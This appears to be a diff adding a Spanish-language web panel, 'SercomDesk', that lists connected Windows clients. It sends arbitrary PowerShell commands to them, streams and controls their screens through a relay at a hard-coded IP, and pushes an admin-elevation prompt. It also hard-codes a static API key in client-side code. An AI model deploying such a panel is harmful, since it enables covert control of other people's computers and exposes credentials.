@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SercomDesk — Panel de Soporte Centralizado</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+:root {
+--bg: #0b0f19;
+--surface: #111827;
+--surface-card: #1f2937;
+--border: #374151;
+--accent: #0066cc;
+--accent-hover: #0052a3;
+--success: #10b981;
+--danger: #ef4444;
+--warning: #f59e0b;
+--text: #f9fafb;
+--text-muted: #9ca3af;
+--radius: 12px;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+font-family: 'Inter', sans-serif;
+background: var(--bg);
+color: var(--text);
+height: 100vh;
+display: flex;
+flex-direction: column;
+overflow: hidden;
+}
+/* --- LOGIN SCREEN --- */
+#login-screen {
+position: fixed;
+inset: 0;
+background: var(--bg);
+display: flex;
+align-items: center;
+justify-content: center;
+z-index: 1000;
+transition: opacity 0.3s ease;
+}
+.login-card {
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: 16px;
+padding: 40px;
+width: 400px;
+box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+text-align: center;
+}
+.login-card h2 {
+font-size: 26px;
+font-weight: 800;
+margin-bottom: 8px;
+letter-spacing: -0.5px;
+}
+.login-card h2 span { color: var(--success); }
+.login-card p {
+color: var(--text-muted);
+font-size: 13px;
+margin-bottom: 24px;
+}
+.form-group {
+margin-bottom: 16px;
+text-align: left;
+}
+.form-group label {
+display: block;
+font-size: 11px;
+font-weight: 600;
+color: var(--text-muted);
+text-transform: uppercase;
+margin-bottom: 6px;
+}
+.form-group input {
+width: 100%;
+background: #182235;
+border: 1px solid var(--border);
+border-radius: var(--radius);
+color: var(--text);
+font-size: 14px;
+padding: 10px 14px;
+outline: none;
+}
+.form-group input:focus { border-color: var(--success); }
+.btn-login {
+width: 100%;
+background: var(--success);
+border: none;
+color: #fff;
+font-weight: 600;
+padding: 12px;
+border-radius: var(--radius);
+cursor: pointer;
+font-size: 14px;
+transition: background 0.2s;
+}
+.btn-login:hover { background: #059669; }
+#login-error {
+color: var(--danger);
+font-size: 12px;
+margin-top: 12px;
+min-height: 18px;
+}
+/* --- DASHBOARD LAYOUT --- */
+#header {
+background: var(--surface);
+border-bottom: 1px solid var(--border);
+padding: 14px 24px;
+display: flex;
+align-items: center;
+justify-content: space-between;
+flex-shrink: 0;
+}
+#header h1 {
+font-size: 18px;
+font-weight: 700;
+}
+#header h1 span { color: var(--success); }
+#main-content {
+flex: 1;
+display: flex;
+flex-direction: column;
+padding: 24px;
+overflow-y: auto;
+}
+/* --- CARDS GRID --- */
+.grid-title {
+font-size: 14px;
+font-weight: 600;
+color: var(--text-muted);
+margin-bottom: 16px;
+text-transform: uppercase;
+letter-spacing: 0.5px;
+}
+#agents-grid {
+display: grid;
+grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+gap: 20px;
+margin-bottom: 30px;
+}
+.agent-card {
+background: var(--surface);
+border: 1px solid var(--border);
+border-radius: var(--radius);
+padding: 20px;
+display: flex;
+flex-direction: column;
+gap: 14px;
+transition: transform 0.2s, border-color 0.2s;
+}
+.agent-card:hover {
+transform: translateY(-2px);
+border-color: #4b5563;
+}
+.agent-card-header {
+display: flex;
+align-items: center;
+justify-content: space-between;
+}
+.agent-id {
+font-size: 18px;
+font-weight: 700;
+color: var(--text);
+}
+.agent-status {
+font-size: 11px;
+font-weight: 600;
+padding: 3px 8px;
+border-radius: 99px;
+background: rgba(16, 185, 129, 0.15);
+color: var(--success);
+}
+.agent-hostname {
+font-size: 13px;
+color: var(--text-muted);
+}
+.stats-container {
+display: flex;
+flex-direction: column;
+gap: 8px;
+}
+.stat-row {
+display: flex;
+justify-content: space-between;
+font-size: 12px;
+}
+.stat-label { color: var(--text-muted); }
+.stat-value { font-weight: 500; }
+.card-actions {
+display: flex;
+gap: 8px;
+margin-top: 6px;
+}
+.btn-card {
+flex: 1;
+padding: 8px 12px;
+border-radius: 8px;
+border: 1px solid var(--border);
+background: var(--surface-card);
+color: var(--text);
+font-size: 12px;
+font-weight: 600;
+cursor: pointer;
+transition: all 0.2s;
+}
+.btn-card:hover {
+background: var(--border);
+}
+.btn-card.primary {
+background: var(--accent);
+border-color: transparent;
+}
+.btn-card.primary:hover {
+background: var(--accent-hover);
+}
+/* --- ACTIVE SESSION MODAL --- */
+#session-view {
+display: none;
+position: fixed;
+inset: 0;
+background: #000;
+z-index: 500;
+flex-direction: column;
+}
+#session-view.active { display: flex; }
+#session-header {
+background: var(--surface);
+border-bottom: 1px solid var(--border);
+padding: 10px 20px;
+display: flex;
+align-items: center;
+gap: 16px;
+color: var(--text);
+}
+#canvas-container {
+flex: 1;
+display: flex;
+align-items: center;
+justify-content: center;
+overflow: hidden;
+position: relative;
+}
+#screen-canvas {
+max-width: 100%;
+max-height: 100%;
+object-fit: contain;
+}
+#remote-cursor {
+position: absolute;
+width: 12px;
+height: 12px;
+border-radius: 50%;
+background: rgba(16,185,129,0.9);
+border: 2px solid #fff;
+pointer-events: none;
+transform: translate(-50%, -50%);
+display: none;
+}
+</style>
+</head>
+<body>
+<!-- PANTALLA DE LOGIN -->
+<div id="login-screen">
+<div class="login-card">
+<h2>Sercom<span>Desk</span></h2>
+<p>Panel de Control y Soporte Remoto</p>
+<div class="form-group">
+<label>Usuario</label>
+<input type="text" id="login-user" placeholder="Usuario" />
+</div>
+<div class="form-group">
+<label>Contraseña</label>
+<input type="password" id="login-pass" placeholder="••••••••" />
+</div>
+<!-- Cloudflare Turnstile -->
+<div style="display: flex; justify-content: center; padding: 10px 0;">
+<div class="cf-turnstile" data-sitekey="0x4AAAAAACGkJx3Djb7AtUCr" data-theme="dark" data-callback="_secOnTurnstileSuccess"></div>
+</div>
+<button class="btn-login" id="btn-login-submit" onclick="_secAttemptLogin()" disabled>Entrar al Panel</button>
+<div id="login-error"></div>
+</div>
+</div>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<script>let _secTurnstileToken = null; window._secOnTurnstileSuccess = function(token) { _secTurnstileToken = token; document.getElementById('btn-login-submit').disabled = false; };</script>
+<!-- CABECERA -->
+<div id="header">
+<h1>Sercom<span>Desk</span> · Panel General</h1>
+<button class="btn-card" style="max-width: 120px;" onclick="_secLogout()">Cerrar Sesión</button>
+</div>
+<!-- CONTENIDO PRINCIPAL -->
+<div id="main-content">
+<div class="grid-title">Clientes Conectados en Tiempo Real</div>
+<div id="agents-grid">
+<!-- Renderizado Dinámico -->
+</div>
+</div>
+<!-- VISUALIZADOR DE SESIÓN EN VIVO -->
+<div id="session-view">
+<div id="session-header">
+<strong id="session-title">Control Remoto: ----</strong>
+<button class="btn-card" style="max-width: 150px; margin-left: auto;" onclick="_secStartStream()">Iniciar Streaming</button>
+<button class="btn-card" style="max-width: 150px;" onclick="_secRequestElevation()">Solicitar Admin</button>
+<button class="btn-card primary" style="max-width: 120px;" onclick="_secCloseSession()">Salir</button>
+</div>
+<div id="canvas-container">
+<canvas id="screen-canvas"></canvas>
+<div id="remote-cursor"></div>
+</div>
+</div>
+<script>
+let _secAuth = false;
+let _secWs = null;
+let _secAgentId = null;
+const WS_RELAY_URL = 'ws://129.159.72.206:6002';
+const canvas = document.getElementById('screen-canvas');
+const ctx = canvas.getContext('2d');
+const remoteCursor = document.getElementById('remote-cursor');
+function _secAttemptLogin() {
+const u = document.getElementById('login-user').value;
+const p = document.getElementById('login-pass').value;
+const errEl = document.getElementById('login-error');
+errEl.textContent = '';
+if (!_secTurnstileToken) {
+errEl.textContent = 'Por favor, completa el reto de Cloudflare Turnstile';
+return;
+}
+fetch('/soporte/login', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ user: u, pass: p, _secTurnstileToken: _secTurnstileToken })
+})
+.then(r => r.json())
+.then(data => {
+if (data.success) {
+_secAuth = true;
+document.getElementById('login-screen').style.display = 'none';
+_secStartMonitoring();
+} else {
+errEl.textContent = data.error || 'Credenciales inválidas';
+if (window.turnstile) turnstile.reset();
+_secTurnstileToken = null;
+document.getElementById('btn-login-submit').disabled = true;
+}
+})
+.catch(err => {
+errEl.textContent = 'Error de red al intentar iniciar sesión';
+if (window.turnstile) turnstile.reset();
+_secTurnstileToken = null;
+document.getElementById('btn-login-submit').disabled = true;
+});
+}
+function _secLogout() {
+_secAuth = false;
+document.getElementById('login-screen').style.display = 'flex';
+}
+async function _secFetchAgents() {
+if (!_secAuth) return;
+try {
+const res = await fetch('/soporte/agentes');
+const agents = await res.json();
+_secRenderGrid(agents);
+} catch (e) {
+console.error('Error al actualizar agentes', e);
+}
+}
+function _secRenderGrid(agents) {
+const grid = document.getElementById('agents-grid');
+grid.innerHTML = '';
+if (Object.keys(agents).length === 0) {
+grid.innerHTML = '<div style="color:var(--text-muted); font-size: 13px;">No hay clientes conectados actualmente.</div>';
+return;
+}
+for (const [id, info] of Object.entries(agents)) {
+const h = info.health || {};
+const cpu = h.cpu ? h.cpu.load + '%' : '—';
+const freeRam = h.os ? h.os.freeRam + ' GB' : '—';
+const os = h.os ? h.os.name.substring(0, 24) : 'Windows';
+const card = document.createElement('div');
+card.className = 'agent-card';
+card.innerHTML = `
+<div class="agent-card-header">
+<span class="agent-id">${id}</span>
+<span class="agent-status">En Línea</span>
+</div>
+<div class="agent-hostname">${info.hostname || 'Desconocido'}</div>
+<div class="stats-container">
+<div class="stat-row"><span class="stat-label">S.O.</span><span class="stat-value">${os}</span></div>
+<div class="stat-row"><span class="stat-label">Uso CPU</span><span class="stat-value">${cpu}</span></div>
+<div class="stat-row"><span class="stat-label">RAM Libre</span><span class="stat-value">${freeRam}</span></div>
+</div>
+<div class="card-actions">
+<button class="btn-card" onclick="_secSendQuickCmd('${id}')">Enviar Cmd</button>
+<button class="btn-card primary" onclick="_secTakeControl('${id}')">Tomar Control</button>
+</div>
+`;
+grid.appendChild(card);
+}
+}
+function _secSendQuickCmd(id) {
+const cmd = prompt('Ingresa el comando de PowerShell a ejecutar en el cliente:');
+if (!cmd) return;
+fetch('/soporte/cmd', {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json',
+'X-Sercom-API-Key': 'SrC0mS0p0rt3#S3cur1tyKey#2026'
+},
+body: JSON.stringify({ id, cmd })
+})
+.then(r => r.json())
+.then(data => alert('Resultado:\n' + (data.output || data.error)))
+.catch(err => alert('Error: ' + err.message));
+}
+function _secTakeControl(id) {
+_secAgentId = id;
+document.getElementById('session-title').textContent = `Control Remoto Activo: ${id}`;
+document.getElementById('session-view').classList.add('active');
+// Conectar WebSocket
+const wsUrl = `${WS_RELAY_URL}?type=panel&id=${id}&panel_key=SrC0mS0p0rt3#S3cur1tyKey#2026`;
+_secWs = new WebSocket(wsUrl);
+_secWs.onmessage = (e) => {
+let msg;
+try { msg = JSON.parse(e.data); } catch { return; }
+if (msg.type === 'frame') {
+const img = new Image();
+img.onload = () => {
+if (canvas.width !== msg.sw || canvas.height !== msg.sh) {
+canvas.width = msg.sw;
+canvas.height = msg.sh;
+}
+ctx.drawImage(img, msg.x, msg.y, msg.cellW, msg.cellH);
+};
+img.src = 'data:image/jpeg;base64,' + msg.data;
+}
+};
+}
+function _secStartStream() {
+if (_secWs) _secWs.send(JSON.stringify({ type: 'start_stream' }));
+}
+function _secRequestElevation() {
+const uacCmd = `Start-Process powershell -Verb runas`;
+fetch('/soporte/cmd', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json', 'X-Sercom-API-Key': 'SrC0mS0p0rt3#S3cur1tyKey#2026' },
+body: JSON.stringify({ id: _secAgentId, cmd: uacCmd })
+});
+}
+function _secCloseSession() {
+if (_secWs) {
+_secWs.send(JSON.stringify({ type: 'stop_stream' }));
+_secWs.close();
+}
+document.getElementById('session-view').classList.remove('active');
+}
+function _secStartMonitoring() {
+_secFetchAgents();
+setInterval(_secFetchAgents, 5000);
+}
+</script>
+</body>
+</html>
